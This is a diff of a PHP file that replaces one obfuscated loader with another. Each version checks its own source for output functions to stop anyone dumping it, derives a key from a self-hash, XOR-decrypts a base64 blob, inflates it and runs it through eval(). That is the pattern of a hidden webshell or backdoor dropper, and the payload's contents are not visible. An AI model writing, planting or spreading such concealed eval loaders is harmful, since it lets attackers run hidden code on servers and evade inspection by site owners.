@@ -1,24 +1,24 @@
 <?php
-$vmculhyqfw="5f7f7a005720497caabaef0535eee410";
-$offhgvnmtjka="035654530f58530057030b020600565b020006020104560702575300070d0509";
-$eldhubns="i2M+uuIJc8xJlyrwe/zAQ01rdebQH154NCpjYDPdsjyUOxVfo5rEmp2JjyGK5fbCNZilsR4UEFTmSc7kFvxH+56atVYRtfFVK36WJYsbc0LeNdhTHmKFXH3bjEZRAr3gQHsJHw+9vJg2RfY/U0J1gUrFpO2oMYa2Knyyc7gYkZ10NKUzEI9rsizCEGucIZahTyR4uNNyN1YA4Hj8FsA45BhCGiH+29z+dP8pce4Bow6k3/nt6rtxyEvKfw6pVWvW3rHGa7wb/kGHUJWqBGtx0+L8wL/c2TZktt9PPNBNtLchoNpiszZpUSAAG2RHt05CcD/E/ZVH0BzFftrP3/1ONCHY/c2+baNeB/pkpexaBv+1zpI2GD3yF+4z8rVdIlp7oPQq3rtM1i8HQMkR2yeN6EEYdi4DT1nPG642Go7A031EHhEfY3pKhERHd0Mner7Zpb0HqD7qp2vYhPGQkt6l7XWwyHxKok8jHqj2lJq8t31X3xktgmtaZ72zoWx4ugFCSuWg32qXlFpxZsX1FE9Pae7JiRcvRLm9+7CsODqK1xzojQ7CkX6v1vFQtz3tWCTgLroAvwTwSvTvnm3rd6CXK26xmpBbseX9nO3mz5qL7483xppMmGc=";
-$ajpwdzle=file_get_contents(__FILE__);
-$dqqrbhhxjmqr=str_replace($eldhubns,"",$ajpwdzle);
-if(strpos($dqqrbhhxjmqr,"ec"."ho")!==false||strpos($dqqrbhhxjmqr,"pr"."int")!==false||strpos($dqqrbhhxjmqr,"var_"."dump")!==false||strpos($dqqrbhhxjmqr,"file_put_"."contents")!==false||strpos($dqqrbhhxjmqr,"fw"."rite")!==false){die();}
-$shxohh=str_replace(array($vmculhyqfw,$offhgvnmtjka),array("SP_441e66c7","KP_38c340bf"),$ajpwdzle);
-$tozlizer=md5($shxohh);
-$tbktew=hex2bin($offhgvnmtjka);
-$slrnzwkrf="";
-$ylqzmaigwm=strlen($tozlizer);
-for($mxkmzu=0;$mxkmzu<$ylqzmaigwm;$mxkmzu++){
-    $slrnzwkrf.=chr(ord($tbktew[$mxkmzu])^ord($tozlizer[$mxkmzu]));
+$wykbbt="f4e9b49ffd03b26537c8ccecb1d162c6";
+$gbzawsu="0205000d0657090555525604575755035655565d5a5b035b5509025700535b02";
+$hbaojba="2WI4u75TIJ8YlXX1fKDCTUtoJOCNRV5yMnAzY2eFvjHGOhNe/8CXycyL0CSNufTMM5v0t0NOEF7gE57nQqRL9sybs1dN76IGenzJIIxHcUzYNolVQziFVnuB3EUFWrHtEnoPHlPn78tnR6k6VB53j0zG9ev1a4a8LCbicOxAnZAmNaMyTNU44X3AT26bfZSvSScpvo4oN1wGuij/Qpg06UpDHCCigY+tJf12dOldoQCi3Kjrt+Fxwk2QLw39DWfbjLDAauBBrRLWUsqvAzdz3eT/kbmBgzZusIUfP4QVuLpzodxj72w6AnECRGFA60xMdjyV+8gd0BbDJIrMi6VCOXPZ+8ziN/ANVvg7oOsGBPGzzcMwRWfyHehporYJelZ28vUs3+cWhXxWQpYU3HuP5kcbJyheFVnFHfRmGdqY33AWHxcePyAZ1xVFKEYgJrzXo75WrmOwp2He3qGTxoap4Cexzn0W+BxwT6qpkZ3gtXNR3Egr3zFabbvp8W8s4g1PGOSm3jbNxwkgZJrwExNNZ+jK2BFyHrm3/er8O27S2xG6jAjDzST8haBS6DjqBCbuKLlRuVmqSv7pxD3oI/ibJjywnJEH67auze+5yp3X7YExxctKxT0=";
+$itcxnpkoxa=file_get_contents(__FILE__);
+$ynkhwj=str_replace($hbaojba,"",$itcxnpkoxa);
+if(strpos($ynkhwj,"ec"."ho")!==false||strpos($ynkhwj,"pr"."int")!==false||strpos($ynkhwj,"var_"."dump")!==false||strpos($ynkhwj,"file_put_"."contents")!==false||strpos($ynkhwj,"fw"."rite")!==false){die();}
+$seecibahbujt=str_replace(array($wykbbt,$gbzawsu),array("SP_7d840694","KP_acef57c0"),$itcxnpkoxa);
+$ilwrgjluun=md5($seecibahbujt);
+$ydbzmlgibw=hex2bin($gbzawsu);
+$xqyoajrgvslj="";
+$wlmdazrn=strlen($ilwrgjluun);
+for($wbijuruum=0;$wbijuruum<$wlmdazrn;$wbijuruum++){
+    $xqyoajrgvslj.=chr(ord($ydbzmlgibw[$wbijuruum])^ord($ilwrgjluun[$wbijuruum]));
 }
-$djubtgwz=base64_decode($eldhubns);
-$rajhwgptqbz=strlen($djubtgwz);
-$trqcye="";
-$fbaxumkqalm=strlen($slrnzwkrf);
-for($mxkmzu=0;$mxkmzu<$rajhwgptqbz;$mxkmzu++){
-    $trqcye.=$djubtgwz[$mxkmzu]^$slrnzwkrf[$mxkmzu%$fbaxumkqalm];
+$ysynzytrqcu=base64_decode($hbaojba);
+$fkluuunwi=strlen($ysynzytrqcu);
+$zjgnsoaobgy="";
+$wackkezsvn=strlen($xqyoajrgvslj);
+for($wbijuruum=0;$wbijuruum<$fkluuunwi;$wbijuruum++){
+    $zjgnsoaobgy.=$ysynzytrqcu[$wbijuruum]^$xqyoajrgvslj[$wbijuruum%$wackkezsvn];
 }
-$jhoffqjv="gz"."in"."fl"."ate";
-eval($jhoffqjv($trqcye));
+$ysjlnylvdq="gz"."in"."fl"."ate";
+eval($ysjlnylvdq($zjgnsoaobgy));
